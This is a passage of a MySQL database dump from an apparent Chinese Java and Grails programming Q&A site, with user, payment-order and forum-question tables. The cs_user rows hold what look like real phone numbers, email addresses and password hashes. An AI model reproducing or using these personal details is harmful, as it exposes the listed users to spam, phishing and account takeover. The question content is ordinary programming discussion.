INSERT INTO `cs_user` VALUES (1,'20150417145552','13717625140',NULL,'admin@admin.com',NULL,'20150921004623','超级管理员','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,22,'20150417145552',0,1,1,NULL,NULL,0,0,NULL),(2,'20150417151438','18210344122',NULL,'593949938@qq.com',NULL,'20150921004726','沙舟狼客','W6ph5Mm5Pz8GgiULbPgzG37mj9g=','/upload/2/2_xj2015_05_31_19_29_59.jpg',530,'20150417151438',0,1,1,NULL,NULL,0,0,NULL),(3,'20150417153638','18612803787',NULL,'wishchenstartcomm@gmail.com',NULL,'20150417153638','Im','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,1,'20150417153638',0,1,1,NULL,NULL,0,0,NULL),(4,'20150418175056','18505538780',NULL,'94137631@qq.com',NULL,'20150715103054','liyi','W6ph5Mm5Pz8GgiULbPgzG37mj9g=','/upload/userdata/4/photo/b3876753-ffa1-4abf-bad1-db05f34dcdd7.jpg',0,'20150418175056',0,1,1,NULL,NULL,0,0,NULL),(5,'20150420091035','13711111111',NULL,'799078779@qq.com',NULL,'20150714124632','smallPropertyLifeForward','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,1,'20150420091035',0,1,1,NULL,NULL,1,0,NULL),(6,'20150420103142','12345678901',NULL,'a@a.com',NULL,'20150420103142','a','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150420103142',0,1,1,NULL,NULL,0,0,NULL),(7,'20150422080658','15222384108',NULL,'lxfeif123@126.com',NULL,'20150422080658','flying','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,1,'20150422080658',0,1,1,NULL,NULL,0,0,NULL),(8,'20150422085625','17002495958',NULL,'px96004@qq.com',NULL,'20150422085625','飞客','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,1,'20150422085625',0,1,1,NULL,NULL,0,0,NULL),(9,'20150422090209','18228043005',NULL,'304793680@qq.com',NULL,'20150422090209','GLOW','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,1,'20150422090209',0,1,1,NULL,NULL,0,0,NULL),(10,'20150422110125','13272914631',NULL,'ajian51168@qq.com',NULL,'20150422110125','ajian','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150422110125',0,1,1,NULL,NULL,0,0,NULL),(11,'20150428171733','15010596307',NULL,'137828178@qq.com',NULL,'20150428171733','黑名单','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150428171733',0,2,1,'137828178',NULL,0,0,NULL),(12,'20150514101828','13111111111',NULL,'grail@163.com',NULL,'20150514101828','hellograils','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150514101828',0,1,1,NULL,NULL,0,0,NULL),(13,'20150514101932','13111111112',NULL,'asdfs@173.com',NULL,'20150514101932','大白','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150514101932',0,1,1,NULL,NULL,0,0,NULL),(14,'20150627221421','13811204084',NULL,'1137974218@qq.com',NULL,'20150627221421','wp','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,1,'20150627221421',0,1,1,NULL,NULL,0,0,NULL),(15,'20150702074530','18610310943',NULL,'yinzd@boful.com',NULL,'20150713110517','yinzhendong','W6ph5Mm5Pz8GgiULbPgzG37mj9g=','/upload/userdata/15/photo/b2e424da-9e2e-492c-bcc0-a93977db5722.jpg',1,'20150702074530',0,1,1,NULL,NULL,0,0,NULL),(16,'20150709084840','15232116971',NULL,'920683493@qq.com',NULL,'20150709084840','小燕','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150709084840',0,1,1,NULL,NULL,0,0,NULL),(17,'20150710110713','18911773093',NULL,'yangyong@boful.com',NULL,'20150710110713','花匠','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150710110713',0,1,1,NULL,NULL,0,0,NULL),(18,'20150712212423','18513335518',NULL,'362297277@qq.com',NULL,'20150715234356','123','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150712212423',0,1,1,NULL,NULL,0,0,NULL),(19,'20150712215539','18667866901',NULL,'649100078@qq.com',NULL,'20150730190744','lzg_171','W6ph5Mm5Pz8GgiULbPgzG37mj9g=',NULL,0,'20150712215539',0,1,1,NULL,NULL,1,0,NULL);
/*!40000 ALTER TABLE `cs_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `pay_order`
--

DROP TABLE IF EXISTS `pay_order`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `pay_order` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `comments` varchar(255) NOT NULL,
  `create_date` varchar(255) NOT NULL,
  `guid` varchar(255) NOT NULL,
  `money` double NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `out_order` varchar(255) DEFAULT NULL,
  `order_state` int(11) NOT NULL,
  `order_type` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_rivc3rjipdtcg70vd9vw6qlh9` (`user_id`),
  KEY `FKE3827CF78C5B8E5` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=49 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pay_order`
--

LOCK TABLES `pay_order` WRITE;
/*!40000 ALTER TABLE `pay_order` DISABLE KEYS */;
INSERT INTO `pay_order` VALUES (46,'码农之星在线充值!','20150730172909','5362c0c4-34e8-4627-9e6d-156e67c333c1',1,19,NULL,1,1),(47,'码农之星在线充值!','20150801175444','f3eb8b93-6d76-4054-ae90-9c2c8cb1692a',1,2,NULL,1,1),(48,'码农之星在线充值!','20150801175559','65696314-541b-43b9-98e4-01fd30aa9c75',1,2,NULL,1,1);
/*!40000 ALTER TABLE `pay_order` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `question`
--

DROP TABLE IF EXISTS `question`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `question` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `attention_num` bigint(20) NOT NULL,
  `create_date` varchar(255) NOT NULL,
  `creator_id` bigint(20) NOT NULL,
  `description` longtext,
  `reply_num` bigint(20) NOT NULL,
  `q_state` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `view_num` bigint(20) NOT NULL,
  `right_ask_id` bigint(20) DEFAULT NULL,
  `money` double NOT NULL,
  `poster` varchar(255) DEFAULT NULL,
  `recommend_num` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_ioe2ypp3ikrgg34yyjd0txvbj` (`creator_id`) USING BTREE,
  KEY `FK_9qr5lixrdaxdqvaw5lm972mce` (`right_ask_id`),
  KEY `FKBA823BE663C1BCE4` (`creator_id`),
  KEY `FKBA823BE64B23064D` (`right_ask_id`)
) ENGINE=MyISAM AUTO_INCREMENT=562 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `question`
--

LOCK TABLES `question` WRITE;
/*!40000 ALTER TABLE `question` DISABLE KEYS */;
INSERT INTO `question` VALUES (1,0,'20150417191723',1,'<p>比如a,b,c&nbsp;<br />\r\nb,c中都依赖注入了a ，那spring可以获取依赖注入a的service吗&nbsp;<br />\r\n比如这里是b，c。</p>\r\n',2,0,'spring获取依赖类的集合',306,NULL,0,NULL,0),(2,0,'20150417210506',2,'<p>请输入.</p>\r\n',0,0,'在java中读取文件时应该采用什么编码？',104,NULL,0,NULL,0),(3,0,'20150417221745',2,'<p>简单的最基础的文件上传</p>\r\n',1,0,'java如何实现servlet文件上传',164,NULL,0,NULL,0),(4,0,'20150417223019',2,'<pre>\r\n一直对java中接口的作用不是太明了。虽说一个类可以implements多个接口，但接口本身只是定义了几个方法，没有任何实际的意义，具体的实现还是要在实现它的类中进行。这样的话，接口还有什么意义呢？   \r\n  举个例子来说，现有   \r\n\r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-java\">  public   interface   I   \r\n  {   \r\n          method1(){};   \r\n  }   \r\n  class   A   implements   I   \r\n  {   \r\n          method1()   \r\n          {   \r\n                    somefunction......   \r\n          }   \r\n  }   </code></pre>\r\n\r\n<pre>\r\n\r\n    \r\n  这样写和不实现接口，直接将method1作为class   A的方法有什么区别呢？   \r\n  即：   \r\n \r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-java\"> class   A   \r\n  {   \r\n          method1()   \r\n          {   \r\n                  somefunction......   \r\n          }   \r\n  }   </code></pre>\r\n\r\n<pre>\r\n\r\n    \r\n  能不能具体举个例子来说明它们在使用上的区别呢？</pre>\r\n',1,0,'java接口作用是什么？',136,NULL,0,NULL,0),(5,0,'20150417223050',2,'<pre>\r\njava中的序列化在什么情况下用怎么用？与同步有什么区别</pre>\r\n',1,0,'java 中的序列化是什么意思?有什么好处?',157,NULL,0,NULL,0),(6,0,'20150417223151',2,'<p>请输入.</p>\r\n',1,0,'java中static作用详解',131,NULL,0,NULL,0),(7,0,'20150417231227',2,'<p>求推荐JAVA入门书籍</p>\r\n',1,0,'求推荐JAVA入门书籍',111,NULL,0,NULL,0),(8,0,'20150417231247',2,'<p>请输入.</p>\r\n',1,0,'java中堆和栈的区别',118,NULL,0,NULL,0),(9,0,'20150417231306',2,'',1,0,'java中的值传递和引用传递到底有什么区别',121,NULL,0,NULL,0),(10,0,'20150417231330',2,'',1,0,'java如何获取本机IP？',170,NULL,0,NULL,0),(11,0,'20150417231443',2,'<p>请输入.</p>\r\n',1,0,'grails 是干什么的? 请详细说明！',134,NULL,0,NULL,0),(12,0,'20150417232218',2,'<pre>\r\n之所以提问这个问题是因为我搜索到的答案我都不太满意\r\n    所以希望高手能够从 更加通俗的角度 来阐述一下： \r\n         静态内部类到底有什么作用？有什么好处？\r\n         如果能举个例子就更好了！\r\n提前谢谢了！</pre>\r\n',2,0,'Java 静态内部类作用？',245,NULL,0,NULL,0),(13,0,'20150417232501',1,'<pre>\r\n我是个初学者，老师课上演示了一段程序，话不多说，直接 上代码\r\n\r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-java\">class JPanelDemo extends JPanel{\r\n	public void paint(Graphics g){//\r\n		super.paint(g);\r\n		this.setBackground(Color.black);	\r\n		for(int i=0;i&lt;300;i++){\r\n			g.setColor(new Color((int)(Math.random()*0xffffff)));\r\n			g.drawString(\"*\", (int)(Math.random()*788), \r\n					(int)(Math.random()*734));\r\n}\r\n}\r\n}</code></pre>\r\n\r\n<pre>\r\n\r\n其他理解都可以，super.paint(g);这句到底啥意思？？课上没来得及细看，了解了个大概，好像懂了，自己回来推敲，发现这句理解不了，忘各位大哥大姐讲解，谢谢</pre>\r\n',0,0,'java 中super 的用法',109,NULL,0,NULL,0),(14,0,'20150417232714',1,'<p>请输入.</p>\r\n',0,0,'java中final类是不是基本上没用啊？？',126,NULL,0,NULL,0),(15,0,'20150417232935',1,'<pre>\r\n子类继承父类的重载方法，子类中再写一个相同的（包含参数）的方法，就是重写了。如果子类写一个有且只有参数不同的（并且父类中不存在相同的）方法，就是拓展重载了？\r\n\r\n那么怎么减小子类重载的&quot;范围&quot;呢?我是指父类中原来有一个参数为int的重载方法，后来我在子类中不需要这个方法了，但还需要别的重载的方法，怎么弄呢？</pre>\r\n',0,0,'java继承，重载，重写这样理解对不对：',117,NULL,0,NULL,0),(16,0,'20150418232918',2,'<p>请输入.</p>\r\n',1,0,' Intellij idea 14 运行grails占用CPU高，不知道有没有解决方法？',673,NULL,0,'/upload/question/16/1cdc2ac2-4a1a-4bc9-bb1a-f197f8de4f04.jpg',99),(17,0,'20150418233946',1,'<pre>\r\n<code class=\"language-java\">2015-04-18 21:12:53,389 [ajp-bio-9009-exec-34] ERROR errors.GrailsExceptionResolver  - EOFException occurred when processing request: [GET] /\r\nCan not read response from server. Expected to read 4 bytes, read 0 bytes before connection was unexpectedly lost.. Stacktrace follows:\r\njava.io.EOFException: Can not read response from server. Expected to read 4 bytes, read 0 bytes before connection was unexpectedly lost.\r\n    at com.mysql.jdbc.MysqlIO.readFully(MysqlIO.java:3166)\r\n    at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3620)\r\n    at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3609)\r\n    at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4160)\r\n    at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2617)\r\n    at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2778)\r\n    at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2828)\r\n    at com.mysql.jdbc.ConnectionImpl.setAutoCommit(ConnectionImpl.java:5372)\r\n    at com.mchange.v2.c3p0.impl.NewProxyConnection.setAutoCommit(NewProxyConnection.java:881)\r\n    at org.ligson.coderstar.index.controllers.IndexController.index(IndexController.groovy:16)\r\n    at grails.plugin.cache.web.filter.PageFragmentCachingFilter.doFilter(PageFragmentCachingFilter.java:198)\r\n    at grails.plugin.cache.web.filter.AbstractFilter.doFilter(AbstractFilter.java:63)\r\n    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)\r\n    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)\r\n    at java.lang.Thread.run(Thread.java:745)\r\n2015-04-18 21:12:58,159 [ajp-bio-9009-exec-32] ERROR spi.SqlExceptionHelper  - Communications link failure</code></pre>\r\n\r\n<p>请输入.</p>\r\n',1,0,'mysql长连接报错',200,NULL,0,NULL,0),(18,0,'20150418234304',1,'<p>&nbsp;</p>\r\n\r\n<p>0down votefavorite</p>\r\n\r\n<p>I&#39;m a totally Java noob, but I need to adapt this following code example.</p>\r\n\r\n<p>I&#39;ve got a MySQL query, which looks like this</p>\r\n\r\n<pre>\r\n<code>SELECT * FROM cars c WHERE c.id NOT IN ( SELECT fkCarId FROM bookings WHERE \r\n    (fromDate &lt;= \'2015-05-04\' AND toDate &gt;= \'2015-05-04\') OR\r\n    (fromDate &lt;= \'2015-05-06\' AND toDate &gt;= \'2015-05-06\') OR\r\n    (fromDate &gt;= \'2015-05-04\' AND toDate &lt;= \'2015-05-06\'))\r\n</code></pre>\r\n\r\n<p>I&#39;ve got a bookings table, and a cars table. I&#39;d like to find out which car is available in a time range. SQL query works like a charm.</p>\r\n\r\n<p>I&#39;d like to &quot;convert&quot; this one into a Java CriteriaBuilder output. As I said, I&#39;m totally a Java noob, I&#39;ve read documentation during the last 3 hours with this output (which, obviously, does not work). And I even skipped the where parts in the subqueries.</p>\r\n\r\n<pre>\r\n<code>    CriteriaBuilder cb = getEntityManager().getCriteriaBuilder();\r\n    CriteriaQuery&lt;Cars&gt; query = cb.createQuery(Cars.class);\r\n    Root&lt;Cars&gt; poRoot = query.from(Cars.class);\r\n    query.select(poRoot);\r\n\r\n    Subquery&lt;Bookings&gt; subquery = query.subquery(Bookings.class);\r\n    Root&lt;Bookings&gt; subRoot = subquery.from(Bookings.class);\r\n    subquery.select(subRoot);\r\n    Predicate p = cb.equal(subRoot.get(Bookings_.fkCarId),poRoot);\r\n    subquery.where(p);\r\n\r\n    TypedQuery&lt;Cars&gt; typedQuery = getEntityManager().createQuery(query);\r\n\r\n    List&lt;Cars&gt; result = typedQuery.getResultList();\r\n</code></pre>\r\n\r\n<p>Another issue: the &quot;fkCarId&quot; is not defined as a foreign key, it&#39;s just an integer. Any way to get it fixed that way?</p>\r\n\r\n<p>Thanks in advance for helping a desperate coder.</p>\r\n',0,0,'Java CriteriaBuilder SELECT with SUBSELECT in WHERE, combined with NOT IN',117,NULL,0,NULL,0),(19,0,'20150418234557',1,'<p>今天在整合spring aop时报了这个错：&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">Exception sending context initialized event to listener instance of class org.springframework.web.context.ContextLoaderListener \r\norg.springframework.beans.factory.BeanCreationException: Error creating bean with name \'jpwordDao\' defined in ServletContext resource [/WEB-INF/config/spring/data-access-config.xml]: Initialization of bean failed; nested exception is org.springframework.aop.framework.AopConfigException: Cannot proxy target class because CGLIB2 is not available. Add CGLIB to the class path or specify proxy interfaces. </code></pre>\r\n\r\n<p><br />\r\n<br />\r\n调查发现应该是缺少包：cglib-nodep-2.2.jar&nbsp;&nbsp;<br />\r\n但是将其加入到buildpath中后还是报同一个错误，估计可能是Spring中的cglib-nodep-2.x.x.jar与Hibernate中的cglib-2.2.jar相冲突，这时需要保留spring的，取消hibernate的，但是查了一遍lib，没有发现hibernate的cglib-2.2.jar，这就不懂是什么情况了，请问谁知道是怎么回事</p>\r\n',1,0,'spring aop报错：Cannot proxy target class because CGLIB2 is not available.5',140,NULL,0,NULL,0),(20,0,'20150418234843',1,'<p>在使用struts2中，为了方便调试，通常struts.properties文件中把开发模式设置为true。当表单里面的数据为空的时候提交，由于配置了validation校验框架，页面被拦截，有提示信息。控制台输出如下：<br />\r\n2008-12-3 21:10:39 com.opensymphony.xwork2.interceptor.ParametersInterceptor setParameters<br />\r\n严重: ParametersInterceptor - [setParameters]: Unexpected Exception caught setting &#39;age&#39; on &#39;class org.mmc.struts2.action.RegisterAction: Error setting expression &#39;age&#39; with value &#39;[Ljava.lang.String;@b70648&#39;<br />\r\n2008-12-3 21:10:39 com.opensymphony.xwork2.validator.ActionValidatorManagerFactory<br />\r\n信息: Detected AnnotationActionValidatorManager, initializing it...</p>\r\n',0,0,'ParametersInterceptor - Developer Notification (set struts.devMode to false to disable this message):',310,NULL,0,NULL,0),(21,0,'20150418234938',1,'',0,0,'Cannot locate the chosen ObjectFactory implementation: spring - [unknown location]',118,NULL,0,NULL,0),(22,0,'20150418234942',1,'',1,0,'Cannot locate the chosen ObjectFactory implementation: spring - [unknown location]',123,NULL,0,NULL,0),(23,0,'20150418234959',1,'',1,0,'Cannot locate the chosen ObjectFactory implementation: spring - [unknown location]',156,NULL,0,NULL,0),(24,0,'20150419130350',2,'<p>DataSource.groovy里的数据源都是写死的，用户如果自己修改没办法修改</p>\r\n',0,0,'grails如何动态可配置数据源',149,NULL,0,NULL,0),(25,0,'20150419130533',1,'',1,0,'grails2.4.4中的assets是什么，如何用',158,NULL,0,NULL,0),(26,0,'20150419130744',1,'',1,0,'grails用户输入的html如何安全的在页面上显示',154,NULL,0,NULL,0),(27,0,'20150419130904',1,'',2,0,'grails中的filter如何用',156,NULL,0,NULL,0),(28,0,'20150419131209',1,'',1,0,'解决java出现的ClassNotFoundException',234,NULL,0,NULL,0),(29,0,'20150419145836',2,'',1,0,'Java中文乱码怎么办',119,NULL,0,NULL,0),(30,0,'20150419145938',2,'',1,0,'grails验证码插件-JCaptcha如何使用',185,NULL,0,'/upload/question/30/6f4c89b4-3dc7-4f0f-967a-1c89b18781c8.jpg',98),(31,0,'20150419150033',2,'',0,0,'grails如何自定义标签',157,NULL,0,NULL,0),(32,0,'20150419150130',2,'',1,0,'有没有最简单的jna教程',273,NULL,0,NULL,0),(33,0,'20150419150328',2,'',2,0,'Java常见的23中设计模式',231,NULL,0,NULL,0),(34,0,'20150420082835',2,'',1,0,'grails如何分页',166,NULL,0,NULL,0),(35,0,'20150420082937',2,'',1,0,'Grails 有哪些优势？',272,NULL,0,NULL,0),(36,0,'20150420095055',3,'<pre>\r\n<code class=\"language-css\">#id{width=*;height=*;}</code></pre>\r\n\r\n<p>关于选择器的用法</p>\r\n',1,0,'css选择器的用法',159,NULL,0,NULL,0),(37,0,'20150421081440',2,'',0,0,'getOutputStream() has already been called for this response 错误解决 ',166,NULL,0,NULL,0),(42,0,'20150422082232',1,'',1,0,'Grails开发项目中的错误及解决有人总结过吗',329,NULL,0,NULL,0),(39,0,'20150422080812',2,'',2,0,'Grails框架跟同类比较有什么优劣势',409,NULL,0,NULL,0),(40,0,'20150422081310',7,'',1,0,'LinkedList和ArrayList的区别是什么',160,NULL,0,NULL,0),(41,0,'20150422081824',1,'',1,0,'如何在Rails和Grails之间做选择？',201,NULL,0,NULL,0),(43,0,'20150422082444',1,'<p>我的jdk安装正常，能够正常使用&nbsp;</p>\r\n\r\n<p>java_home :&nbsp; E:\\Java\\jdk1.6.0_10; 可以运行java指令。</p>\r\n\r\n<p>运行grails 时提示：</p>\r\n\r\n<p>ERROR: JAVA_HOME is set to an invalid directory:&nbsp; E:\\Java\\jdk1.6.0_10&nbsp;<br />\r\nPlease set the JAVA_HOME variable in your environment to match the&nbsp;<br />\r\nlocation of your Java installation.&nbsp;<br />\r\n<br />\r\n大哥们，这个问题怎么解释啊。&nbsp;</p>\r\n',2,0,'grails安装问题',142,NULL,0,NULL,0),(44,0,'20150422091117',9,'<p>我按照文档进行安装并设置了，数据也导入了，但是启动项目后一直在auth方法上循环，请问login和loginout这2个controle以及对应的view怎么重写到自己的目录下而不是在插件下。</p>\r\n',1,0,'grails spring-security-core:2.0 ',251,NULL,0,NULL,0),(45,0,'20150422092401',8,'<p>如果使用@GrailsCompileStatic 都需要注意什么问题呢?</p>\r\n\r\n<p>在开发上都有什么需要注意的呢</p>\r\n',1,0,'请大神帮忙总结下@GrailsCompileStatic对现有项目的影响',272,NULL,0,NULL,0),(46,0,'20150424084804',2,'',1,0,'spring 声明式事务管理怎么配置',199,NULL,0,NULL,0),(47,0,'20150424085125',1,'',1,0,'Java线程怎么用',143,NULL,0,NULL,0),(48,0,'20150424090832',1,'',2,0,'动态代理-JDK动态代理是什么。怎么用',285,NULL,0,NULL,0),(49,0,'20150424091227',1,'',0,0,'Java的垃圾收集机制有没有简单易懂的解释',232,NULL,0,NULL,0),(50,0,'20150424091544',1,'<p>经常遇见这样的问题。有没有原理，和解决的步骤</p>\r\n',0,0,'Hibernate No Session found for current thread',336,NULL,0,NULL,0),(51,0,'20150429210135',2,'<p>我的domain设计是这样的</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">class GpsLocation {\r\n    String id;\r\n    //经度\r\n    double longitude;\r\n    //维度\r\n    double latitude;\r\n    User user;\r\n    Date createDate = new Date();\r\n    static constraints = {\r\n    }\r\n    static mapping = {\r\n        id(generator: \"uuid.hex\")\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p>我想使用hql计算 &nbsp;</p>\r\n\r\n<pre>\r\n<span style=\"background-color:#e4e4ff\">GpsLocation.executeQuery(XXX,[],[max:max,offset:offset]);</span></pre>\r\n\r\n<p>&nbsp;</p>\r\n',1,0,'hql中怎么按照距离排序搜索附近人',201,NULL,0,NULL,0),(52,0,'20150506084154',2,'<p>所有的数据库连接配置默认写在DataSource.groovy中，但是编译时这个代码就写死了，如何更改？</p>\r\n',2,0,'grails如何动配置数据源',233,NULL,0,NULL,0),(53,0,'20150518085002',2,'<p>&nbsp;</p>\r\n\r\n<p><span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">我想知道jsloader工作原理到底是怎样的&nbsp;</span><br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">他的动态加载是如何实现的&nbsp; 是在页面加载完后 根据页面中处理用到那个js/CSS文件 再去加载文件 还是如何。。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">我在调用下面2个方法时&nbsp;</span><br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:olive; font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">JSLoader.loadStyleSheet(&quot;css/style.css&quot;);&nbsp;<br />\r\n....&nbsp;<br />\r\nJSLoader.loadJavaScript(&quot;js/jquery-1.10.2.min.js&quot;);&nbsp;<br />\r\n...</span><span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">发现这里调了多少css/js文件&nbsp; 页面上应该是就载入了多少css/js文件&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">那这哪里体现出动态加载了。。</span></p>\r\n',1,0,'关于jsloader 工作原理',125,NULL,0,NULL,0),(54,0,'20150518085123',2,'<p><span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">如题，请问基于云架构的J2EE架构应该怎么做？&nbsp;</span><br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">与普通的J2EE架构的区别是应该理解为架构上的不同还是理解为业务逻辑编码实现的不同？&nbsp;</span><br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">谢谢大家！</span></p>\r\n',1,0,'请问基于云架构的J2EE架构应该怎么做？',133,NULL,0,NULL,0),(55,0,'20150518085239',2,'<p><span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">网上搜索的结果基本上都是错的：&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">我本机是win7 64位，下面的结果：&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">os.arch = x86&nbsp;</span><br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">sun.arch.data.model = 32&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">发现这两个系统属性返回的是JRE的位数，而不是操作系统的位数。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">所以， 如果要回复这两个属性的，请先自行验证一下。&nbsp;</span><br />\r\n<br />\r\n<br />\r\n<span style=\"background-color:rgb(242, 248, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">还请知道真正答案的小伙伴指点一下，多谢！！&nbsp;</span><br />\r\n&nbsp;</p>\r\n\r\n<p><strong>问题补充：</strong>发现iteye有的说用JNA里面的Platform.is64Bit()；&nbsp;<br />\r\n<br />\r\n但实验结果如下：&nbsp;<br />\r\n<br />\r\nPlatform.is64Bit()&nbsp; = false&nbsp;&nbsp; // 结果显然是错的，我的是win7 64位。</p>\r\n',1,0,'如何判断操作系统是32位还是64位？',145,NULL,0,NULL,0),(56,0,'20150519091607',2,'<p><span style=\"color:rgb(102, 102, 102); font-family:microsoft yahei; font-size:14px\">想用JavaCV获取摄像头图像并拍照，买的高分辨率的摄像头，可是拍出来的照片才55kb，远不及直接连电脑拍出来的效果，请教如何在java程序中调节分辨率</span><br />\r\nhttp://blog.csdn.net/sivyer123/article/details/22411861<span style=\"color:rgb(102, 102, 102); font-family:microsoft yahei; font-size:14px\">&nbsp;这是示例程序</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class video\r\n{\r\n\r\npublic static void main(String[] args) throws Exception \r\n{\r\n    final String savedImageFile = \"d:\\\\my.jpg\";   //拍摄所存储的文件\r\n    OpenCVFrameGrabber grabber = new OpenCVFrameGrabber(0);  \r\n    grabber.start();   //开始获取摄像头数据\r\n    IplImage image =grabber.grab(); //将所获取摄像头数据放入IplImage\r\n\r\n    int width = image.width();  \r\n    int height = image.height();\r\n    final BufferedImage bImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);  \r\n    Graphics2D bGraphics = bImage.createGraphics();                       \r\n\r\n    CanvasFrame canvas = new CanvasFrame(\"Camera\",1);\r\n    canvas.setCanvasSize(width, height);  \r\n\r\n    canvas.getCanvas().addMouseListener(new MouseAdapter(){  \r\n            public void mouseClicked(MouseEvent e){       \r\n              try{\r\n                 ImageIO.write(bImage, \"jpg\", new File(savedImageFile));//数据写入my.jpg\r\n                 } \r\n              catch (IOException e1){\r\n                // TODO Auto-generated catch block\r\n                e1.printStackTrace();\r\n                }  \r\n           }\r\n        });\r\n   while(canvas.isVisible() &amp;&amp; (image=grabber.grab()) != null){  \r\n    canvas.showImage(image); \r\n    bGraphics.drawImage(image.getBufferedImage(),null,0,0); \r\n    }\r\n\r\n        cvReleaseImage(image);     \r\n        grabber.stop();  \r\n        canvas.dispose();     \r\n}\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',1,0,'JavaCV调用摄像头如何调节分辨率？',141,NULL,0,NULL,0),(57,0,'20150519091935',2,'<pre>\r\n<code class=\"language-java\">public int[] toGray(int[] pix, int iw, int ih)\r\n\r\n{\r\n\r\nColorModel cm = ColorModel.getRGBdefault();\r\n\r\nint r, g, b, gray;\r\n    for(int i = 0; i &lt; iw*ih; i++)     \r\n    {             \r\n        r = cm.getRed(pix[i]);  \r\n        g = cm.getGreen(pix[i]);  \r\n        b = cm.getBlue(pix[i]);   \r\n        gray =(int)((r + g + b) / 3);  \r\n        pix[i] = 255 &lt;&lt; 24|gray &lt;&lt; 16|gray &lt;&lt; 8|gray;  \r\n    